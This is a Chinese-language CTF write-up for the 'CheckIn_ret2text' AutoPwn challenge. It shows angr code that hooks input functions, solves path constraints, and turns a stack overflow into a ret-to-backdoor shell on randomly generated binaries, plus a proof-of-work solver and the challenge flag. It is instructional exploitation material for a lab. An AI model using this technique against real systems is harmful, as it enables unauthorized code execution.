# CheckIn_ret2text

## 题目简述

这是动态生成二进制的 AutoPwn。服务先给出 4 字节 SHA-256 PoW，随后随机生成一棵深度 6 的分支树，编译为无 PIE、无栈保护的 C++ ELF，再把二进制以 Base64 发送给选手并立即运行。分支节点混合字符串异或比较和整数算术约束；恰有一个叶子包含栈溢出：

```c
char exp_buffer[exploit_size];          // exploit_size 随机为 10 至 20
input_line(exp_buffer, exploit_size + 40);
```

二进制还固定包含 `backdoor()`，内部执行 `system("/bin/sh")`。每次连接的控制树和溢出位置都不同，适合用 angr 同时求路径约束和控制流覆盖。原仓库中的题目目录是未拉取的 Git 子模块，生成器、官方 exp 与 flag 已从[出题人的官方仓库](https://github.com/P4nda0s/CheckIn_ret2text)补齐核对。

## 解题过程

### 处理 PoW 与样本

服务给出：

```text
sha256(xxxx + suffix) == digest
```

枚举字母数字组成的四字节前缀，找到满足摘要的 `xxxx`。通过 PoW 后，收取 `==end==` 前的 Base64，解码为本轮 ELF。必须对每轮新二进制重新分析，不能沿用上一连接的输入或函数地址。

```python
import base64
import hashlib
import itertools
import string

alphabet = (string.ascii_letters + string.digits).encode()

def solve_pow(suffix, expected):
    for candidate in itertools.product(alphabet, repeat=4):
        prefix = bytes(candidate)
        if hashlib.sha256(prefix + suffix).hexdigest() == expected:
            return prefix
    raise ValueError("PoW 无解")
```

### 用 hooks 缩小符号执行范围

生成器中的 `fksth`、`input_line`、`input_val` 和 `init` 都是稳定函数，但随机树会反复调用。官方解法按符号名 hook：

```text
_Z5fksthPKcS0_
_Z10input_linePcm
_Z9input_valv
_Z4initv
```

`input_line` hook 为每次读取创建对应长度的符号字节并按真实输入顺序保存；`input_val` 创建一段以空格结束的符号十进制整数；`fksth` 直接建立两字符串的等价比较约束。这样 angr 不必在逐字节 I/O 循环和自制比较函数里浪费状态，只需探索随机分支条件。

### 捕获 unconstrained RIP

开启 `save_unconstrained=True`。走到唯一的溢出叶子并从函数返回时，保存的返回地址来自 `exp_buffer` 后 40 字节，angr 会把状态放入 `simgr.unconstrained`。此时不需要猜栈偏移，直接加入“当前 RIP 为一个 `ret`，栈顶下一项为 `backdoor`”的约束：

```python
project = angr.Project(binary_path, auto_load_libs=False)
state = project.factory.full_init_state()
simgr = project.factory.simulation_manager(state, save_unconstrained=True)

while simgr.active and not simgr.unconstrained:
    simgr.step()

crash = simgr.unconstrained[0]
crash.add_constraints(crash.regs.rip == ret_address)
crash.add_constraints(
    crash.memory.load(crash.regs.rsp, 8, endness=project.arch.memory_endness)
    == backdoor_address
)
assert crash.solver.satisfiable()
```

前置分支的字符串/整数输入与溢出字节都由同一个最终状态求值。按 hook 记录的调用次序拼接：`input_line` 数据保持定长，`input_val` 后补空格；最后把满足 `ret -> backdoor` 的溢出内容发送给仍在等待输入的服务。固定 `ret` 用于处理 x86-64 栈对齐，避免直接进入 `system` 时因 ABI 对齐崩溃。

官方仓库保留的部署 flag 为：

```text
SCTF{ANGR_POWERFUL_TOOOOOOOL_STACKKKKK_EASY!}
```

## 方法总结

这道题的重点不是手工读完随机生成的 64 个叶子，而是把输入函数抽象成可靠符号源，让 angr 只处理有区分度的分支和最终返回地址。成功条件是捕获由栈覆盖产生的 unconstrained RIP，再约束为 `ret -> backdoor` 并一次性具体化此前所有输入。由于本地仓库只留下空子模块，本篇保留官方仓库链接作为缺失附件来源，同时已把生成规则、编译保护、hook 边界和利用条件完整写入正文。
